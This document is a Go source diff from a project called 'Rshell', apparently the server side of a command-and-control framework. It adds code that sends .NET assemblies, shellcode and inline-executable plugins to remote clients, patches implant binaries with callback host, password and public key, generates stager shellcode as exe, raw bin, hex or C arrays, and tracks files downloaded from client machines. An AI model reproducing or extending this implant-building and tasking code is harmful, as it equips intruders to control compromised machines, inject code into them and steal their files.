@@ -3,13 +3,18 @@ package service
 import (
 	"Rshell/pkg/command"
 	"Rshell/pkg/common"
-	"Rshell/pkg/connection"
 	"Rshell/pkg/database"
+	"Rshell/pkg/encrypt"
+	"Rshell/pkg/godonut"
 	"Rshell/pkg/proxy"
 	"Rshell/pkg/sendcommand"
 	svc "Rshell/pkg/service"
+	"bytes"
+	"encoding/binary"
 	"fmt"
+	"os"
 	"strings"
+	"time"
 )
 
 // Services aggregates all domain services. Injected into handlers via gin middleware.
@@ -196,7 +201,6 @@ func (s *ListenerService) DeleteListener(addr string) error {
 
 	_, err = database.Engine.Where("listen_address = ?", addr).Delete(&database.Listener{})
 	return err
-	return err
 }
 
 // Socks5Service handles SOCKS5 proxy management.
@@ -351,35 +355,297 @@ func (s *PluginService) ListPlugins() ([]database.Plugin, error) {
 	return plugins, err
 }
 
+func (s *PluginService) AddPlugin(name, osType, pluginType, fileName, filePath string, uploadTime int64) error {
+	plugin := database.Plugin{
+		Name:       name,
+		Os:         osType,
+		Type:       pluginType,
+		FileName:   fileName,
+		FilePath:   filePath,
+		UploadTime: uploadTime,
+	}
+	_, err := database.Engine.Insert(&plugin)
+	return err
+}
+
+func (s *PluginService) GetPlugin(id int64) (*database.Plugin, error) {
+	var plugin database.Plugin
+	has, err := database.Engine.ID(id).Get(&plugin)
+	if err != nil || !has {
+		return nil, errNotFound
+	}
+	return &plugin, nil
+}
+
 func (s *PluginService) DeletePlugin(id int64) error {
 	var plugin database.Plugin
-	has, err := database.Engine.Where("id = ?", id).Get(&plugin)
+	has, err := database.Engine.ID(id).Get(&plugin)
 	if err != nil || !has {
 		return errNotFound
 	}
 
-	_, err = database.Engine.Where("id = ?", id).Delete(&database.Plugin{})
+	if plugin.FilePath != "" {
+		os.Remove(plugin.FilePath)
+	}
+
+	_, err = database.Engine.ID(id).Delete(&database.Plugin{})
 	return err
-	return err
+}
+
+func (s *PluginService) ExecutePlugin(id int64, uid, args string) error {
+	var plugin database.Plugin
+	has, err := database.Engine.ID(id).Get(&plugin)
+	if err != nil || !has {
+		return errNotFound
+	}
+
+	fileBytes, err := os.ReadFile(plugin.FilePath)
+	if err != nil {
+		return err
+	}
+
+	s.appendShellHistory(uid, "$ plugin "+plugin.Name+" "+args+"\n")
+
+	if plugin.Os == "windows" {
+		switch plugin.Type {
+		case "execute-assembly":
+			fileLength := len(fileBytes)
+			fileLengthBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+			byteToSend := bytes.Join([][]byte{fileLengthBytes, fileBytes, []byte(args)}, nil)
+			cmdTypeBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
+			byteToSend = append(cmdTypeBytes, byteToSend...)
+			sendcommand.SendCommandBytes(uid, byteToSend)
+		case "inline-bin":
+			var u database.Clients
+			database.Engine.Where("uid = ?", uid).Get(&u)
+			payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
+			if err != nil {
+				return fmt.Errorf("unable to generate shellcode")
+			}
+			cmdTypeBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
+			byteToSend := bytes.Join([][]byte{cmdTypeBytes, payload}, nil)
+			sendcommand.SendCommandBytes(uid, byteToSend)
+		case "shellcode-inject":
+			cmdTypeBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
+			byteToSend := bytes.Join([][]byte{cmdTypeBytes, fileBytes}, nil)
+			sendcommand.SendCommandBytes(uid, byteToSend)
+		case "inline-execute":
+			fileLength := len(fileBytes)
+			fileLengthBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+			byteToSend := bytes.Join([][]byte{fileLengthBytes, fileBytes, []byte(args)}, nil)
+			cmdTypeBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineExecute))
+			byteToSend = append(cmdTypeBytes, byteToSend...)
+			sendcommand.SendCommandBytes(uid, byteToSend)
+		}
+	} else if plugin.Os == "linux" {
+		if plugin.Type == "script" {
+			fileLength := len(fileBytes)
+			fileLengthBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+			byteToSend := bytes.Join([][]byte{fileLengthBytes, fileBytes, []byte(args)}, nil)
+			cmdTypeBytes := make([]byte, 4)
+			binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteLinuxScript))
+			byteToSend = append(cmdTypeBytes, byteToSend...)
+			sendcommand.SendCommandBytes(uid, byteToSend)
+		}
+	}
+	return nil
+}
+
+func (s *PluginService) appendShellHistory(uid, text string) {
+	var shell database.Shell
+	database.Engine.Where("uid = ?", uid).Get(&shell)
+	shell.ShellContent += text
+	database.Engine.Where("uid = ?", uid).Cols("shell_content").Update(&shell)
+}
+
+// ServerGeneratorService handles server binary generation.
+type ServerGeneratorService struct{}
+
+func (s *ServerGeneratorService) GenerateServer(osType, archType, listener, pass string) ([]byte, string, error) {
+	listenerTmp := strings.Split(listener, "://")
+	listenerType := listenerTmp[0]
+	connectAddress := listenerTmp[1]
+
+	binaryFileName := svc.FindBinary(listenerType, osType, archType)
+	if binaryFileName == "" {
+		return nil, "", fmt.Errorf("binary file not found for %s/%s/%s", listenerType, osType, archType)
+	}
+
+	binaryData, err := svc.EmbeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
+	if err != nil {
+		return nil, "", fmt.Errorf("failed to read binary: %v", err)
+	}
+
+	modifiedData := patchBinaryData(binaryData, listenerType, connectAddress, pass)
+	return modifiedData, binaryFileName, nil
+}
+
+func (s *ServerGeneratorService) ListActiveListeners() ([]string, error) {
+	var listeners []database.Listener
+	err := database.Engine.Where("status = ?", 1).Find(&listeners)
+	if err != nil {
+		return nil, err
+	}
+	result := make([]string, 0, len(listeners))
+	for _, l := range listeners {
+		result = append(result, l.Type+"://"+l.ConnectAddress)
+	}
+	return result, nil
+}
+
+// patchBinaryData patches a binary with connection info, password, and public key.
+func patchBinaryData(binaryData []byte, listenerType, connectAddress, pass string) []byte {
+	var modifiedData []byte
+
+	if listenerType == "oss" {
+		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		newStr := strings.ReplaceAll(connectAddress, " ", "")
+		tmp, _ := encrypt.EncryptNormal([]byte(newStr))
+		tmp2, _ := encrypt.EncodeBase64(tmp)
+		newStr = string(tmp2)
+		newStr = svc.PadRight(newStr, len(oldStr))
+		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
+	} else {
+		oldStr := "HOSTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+		newStr := strings.ReplaceAll(connectAddress, " ", "")
+		newStr = svc.PadRight(newStr, len(oldStr))
+		modifiedData = bytes.ReplaceAll(binaryData, []byte(oldStr), []byte(newStr))
+	}
+
+	oldPass := "PASSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+	newPass := svc.PadRight(pass, len(oldPass))
+	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPass), []byte(newPass))
+
+	oldPublicKey := "ServerPublicKeyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+	var key database.Key
+	database.Engine.Where("1=1").Get(&key)
+	newPublicKey := svc.PadRight(key.PublicKey, len(oldPublicKey))
+	modifiedData = bytes.ReplaceAll(modifiedData, []byte(oldPublicKey), []byte(newPublicKey))
+
+	return modifiedData
 }
 
 // ShellcodeService handles shellcode generation.
 type ShellcodeService struct{}
 
-// ServerGeneratorService handles server binary generation.
-type ServerGeneratorService struct{}
+func (s *ShellcodeService) GenerateStageShellcode(port, format string) (content []byte, filename, ctype string, err error) {
+	var wd database.WebDelivery
+	has, err := database.Engine.Where("listening_port = ?", port).Get(&wd)
+	if err != nil || !has {
+		return nil, "", "", fmt.Errorf("web delivery config not found for port %s", port)
+	}
+
+	connectUrl := wd.ServerAddress + ".woff"
+	var binaryFileName string
+	switch wd.Arch {
+	case "386":
+		binaryFileName = "stager_x86.exe"
+	case "amd64":
+		binaryFileName = "stager_x64.exe"
+	default:
+		return nil, "", "", fmt.Errorf("unsupported arch: %s", wd.Arch)
+	}
+
+	binaryData, err := svc.EmbeddedStager.ReadFile("stageshellcode/" + binaryFileName)
+	if err != nil {
+		return nil, "", "", fmt.Errorf("failed to read stager: %v", err)
+	}
+
+	oldStr := "URLHEREhttp://example.com/placeholder.dat"
+	newStr := utf16LEEncodeStr(connectUrl)
+	newStr = svc.PadRight(newStr, len(oldStr))
+	modifiedData := bytes.ReplaceAll(binaryData, []byte(oldStr), utf16LEStrBytes(newStr))
+
+	sc, _ := godonut.GenShellcode(modifiedData, "", wd.Arch)
+
+	switch strings.ToLower(format) {
+	case "exe":
+		content = modifiedData
+		ctype = "application/octet-stream"
+		filename = binaryFileName
+	case "bin":
+		content = sc
+		filename = "payload.bin"
+		ctype = "application/octet-stream"
+	case "hex":
+		content = []byte(formatHex(sc))
+		filename = "payload.txt"
+		ctype = "text/plain"
+	case "c":
+		content = formatCString(sc)
+		filename = "payload.c"
+		ctype = "text/x-csrc"
+	default:
+		return nil, "", "", fmt.Errorf("unsupported format: %s", format)
+	}
+	return content, filename, ctype, nil
+}
+
+func utf16LEEncodeStr(s string) string {
+	runes := []rune(s)
+	out := make([]byte, len(runes)*2)
+	for i, r := range runes {
+		out[i*2] = byte(r)
+		out[i*2+1] = byte(r >> 8)
+	}
+	return string(out)
+}
+
+func utf16LEStrBytes(s string) []byte {
+	runes := []rune(s)
+	out := make([]byte, len(runes)*2)
+	for i, r := range runes {
+		out[i*2] = byte(r)
+		out[i*2+1] = byte(r >> 8)
+	}
+	return out
+}
+
+func utf16LEBytes(s string) []byte {
+	encoded := utf16Encode([]rune(s))
+	out := make([]byte, len(encoded)*2)
+	for i, v := range encoded {
+		out[i*2] = byte(v)
+		out[i*2+1] = byte(v >> 8)
+	}
+	return out
+}
+
+func utf16Encode(runes []rune) []uint16 {
+	out := make([]uint16, len(runes))
+	for i, r := range runes {
+		out[i] = uint16(r)
+	}
+	return out
+}
+
+func formatHex(data []byte) string {
+	var buf strings.Builder
+	for _, b := range data {
+		buf.WriteString(fmt.Sprintf("%02x", b))
+	}
+	return buf.String()
+}
+
+func formatCString(data []byte) []byte {
+	var buf bytes.Buffer
+	buf.WriteString("unsigned char shellcode[] = \"")
+	for _, b := range data {
+		buf.WriteString(fmt.Sprintf("\\x%02x", b))
+	}
+	buf.WriteString("\";\n")
+	return buf.Bytes()
+}
 
 // ClientService handles client management.
 type ClientService struct{}
-
-func (s *ClientService) GetClients(page, pageSize int) ([]database.Clients, int64, error) {
-	var clients []database.Clients
-	total, err := database.Engine.Limit(pageSize, (page-1)*pageSize).FindAndCount(&clients)
-	if err != nil {
-		return nil, 0, err
-	}
-	return clients, total, nil
-}
 
 func (s *ClientService) GetNote(uid string) (string, error) {
 	var client database.Clients
@@ -422,6 +688,94 @@ func (s *ClientService) GetDownloadsInfo(uid string) ([]database.Downloads, erro
 	return downloads, err
 }
 
+// DownloadsInfo is the formatted download info returned to clients.
+type DownloadsInfo struct {
+	FileName       string `json:"fileName"`
+	FilePath       string `json:"filePath"`
+	FileSize       string `json:"fileSize"`
+	DownloadedPart string `json:"downloadPart"`
+}
+
+func (s *ClientService) GetDownloadsInfoFormatted(uid string) ([]DownloadsInfo, error) {
+	downloads, err := s.GetDownloadsInfo(uid)
+	if err != nil {
+		return nil, err
+	}
+	result := make([]DownloadsInfo, 0, len(downloads))
+	for _, d := range downloads {
+		info := DownloadsInfo{
+			FileName: d.FileName,
+			FilePath: d.FilePath,
+			FileSize: fmt.Sprintf("%d", d.FileSize),
+		}
+		if d.FileSize != 0 {
+			info.DownloadedPart = fmt.Sprintf("%d", d.DownloadedSize*100/d.FileSize)
+		} else {
+			info.DownloadedPart = "0"
+		}
+		result = append(result, info)
+	}
+	return result, nil
+}
+
+func (s *ClientService) ListClients() ([]database.Clients, error) {
+	var clients []database.Clients
+	_, err := database.Engine.FindAndCount(&clients)
+	return clients, err
+}
+
+func (s *ClientService) GetClients() ([]database.Clients, error) {
+	var clients []database.Clients
+	err := database.Engine.Find(&clients)
+	return clients, err
+}
+
+func (s *ClientService) EditSleep(uid string, sleep string) error {
+	var client database.Clients
+	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
+	if err != nil || !has {
+		return errNotFound
+	}
+	client.Sleep = sleep
+	_, err = database.Engine.Where("uid = ?", uid).Cols("sleep").Update(&client)
+	return err
+}
+
+func (s *ClientService) EditColor(uid, color string) error {
+	var client database.Clients
+	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
+	if err != nil || !has {
+		return errNotFound
+	}
+	client.Color = color
+	_, err = database.Engine.Where("uid = ?", uid).Cols("color").Update(&client)
+	return err
+}
+
+func (s *ClientService) AddNote(uid, note string) error {
+	var client database.Clients
+	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
+	if err != nil || !has {
+		return errNotFound
+	}
+	client.Note = note
+	_, err = database.Engine.Where("uid = ?", uid).Cols("note").Update(&client)
+	return err
+}
+
+func (s *ClientService) AddUidNote(uid, note string) error {
+	_, err := database.Engine.Where("uid = ?", uid).Update(&database.Clients{Note: note})
+	return err
+}
+
+// AppendShellHistory appends text to a client's shell history.
+func (s *ClientService) AppendShellHistory(uid, text string) {
+	var shell database.Shell
+	database.Engine.Where("uid = ?", uid).Get(&shell)
+	shell.ShellContent += text
+	database.Engine.Where("uid = ?", uid).Cols("shell_content").Update(&shell)
+}
+
 func (s *ClientService) SendShellCommand(uid, cmd string) error {
 	sendcommand.SendCommand(uid, cmd)
 
@@ -439,48 +793,64 @@ func (s *ClientService) SendShellCommand(uid, cmd string) error {
 	return nil
 }
 
-func (s *ClientService) ExitClient(uid string) error {
+func (s *ClientService) InitiateDownload(uid, filePath string) error {
+	var fileDownloads database.Downloads
+	exist, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads)
+	if err != nil {
+		return err
+	}
+
+	safeFileName := filePath
+	if idx := strings.LastIndex(filePath, "/"); idx != -1 {
+		safeFileName = filePath[idx+1:]
+	}
+	safeFileName = strings.ReplaceAll(safeFileName, "/", "")
+	safeFileName = strings.ReplaceAll(safeFileName, "\\", "")
+
+	if !exist {
+		record := &database.Downloads{
+			Uid:            uid,
+			FileName:       safeFileName,
+			FilePath:       filePath,
+			FileSize:       0,
+			DownloadedSize: 0,
+		}
+		_, err = database.Engine.Insert(record)
+		return err
+	}
+
+	_, err = database.Engine.Exec("UPDATE downloads SET file_size = 0, downloaded_size = 0 WHERE uid = ? AND file_path = ?", uid, filePath)
+	return err
+}
+
+func (s *ClientService) ExitClientAsync(uid string) {
 	sendcommand.SendCommand(uid, "exit")
 
-	connection.MuClientListenerType.Lock()
-	listenerType := connection.ClientListenerType[uid]
-	delete(connection.ClientListenerType, uid)
-	connection.MuClientListenerType.Unlock()
+	go func() {
+		var client database.Clients
+		database.Engine.Where("uid = ?", uid).Get(&client)
+		duration, _ := time.ParseDuration(client.Sleep + "s")
+		time.Sleep(duration)
 
-	if listenerType == "tcp" {
-		if listener, exists := connection.TCPServer[uid]; exists {
-			listener.Close()
-			delete(connection.TCPServer, uid)
+		database.Engine.Where("uid = ?", uid).Delete(&database.Clients{})
+		database.Engine.Where("uid = ?", uid).Delete(&database.Downloads{})
+		database.Engine.Where("uid = ?", uid).Delete(&database.Notes{})
+		database.Engine.Where("uid = ?", uid).Delete(&database.Shell{})
+
+		var socks5 []database.Socks5
+		database.Engine.Where("uid = ?", uid).Find(&socks5)
+		for _, s := range socks5 {
+			if _, exists := proxy.Socks5Serve[s.Socks5port]; exists {
+				proxy.Socks5Serve[s.Socks5port].Close()
+				proxy.MuSocks5Serve.Lock()
+				delete(proxy.Socks5Serve, s.Socks5port)
+				proxy.MuSocks5Serve.Unlock()
+			}
 		}
-	} else if listenerType == "kcp" {
-		if listener, exists := connection.KCPServer[uid]; exists {
-			listener.Close()
-			delete(connection.KCPServer, uid)
-		}
-	} else if listenerType == "web" {
-		if listener, exists := connection.HttpServer[uid]; exists {
-			listener.Close()
-			delete(connection.HttpServer, uid)
-		}
-	}
+		database.Engine.Where("uid = ?", uid).Delete(&database.Socks5{})
 
-	database.Engine.Where("uid = ?", uid).Delete(&database.Clients{})
-	database.Engine.Where("uid = ?", uid).Delete(&database.Notes{})
-	database.Engine.Where("uid = ?", uid).Delete(&database.Shell{})
-	database.Engine.Where("uid = ?", uid).Delete(&database.Socks5{})
-	database.Engine.Where("uid = ?", uid).Delete(&database.Downloads{})
-
-	proxy.MuSocks5Serve.Lock()
-	for port, l := range proxy.Socks5Serve {
-		_ = port
-		l.Close()
-		delete(proxy.Socks5Serve, port)
-	}
-	proxy.MuSocks5Serve.Unlock()
-
-	delete(command.UidFileBrowser, uid)
-
-	return nil
+		command.DeleteFileBrowserUID(uid)
+	}()
 }
 
 // Sentinel errors for service layer.
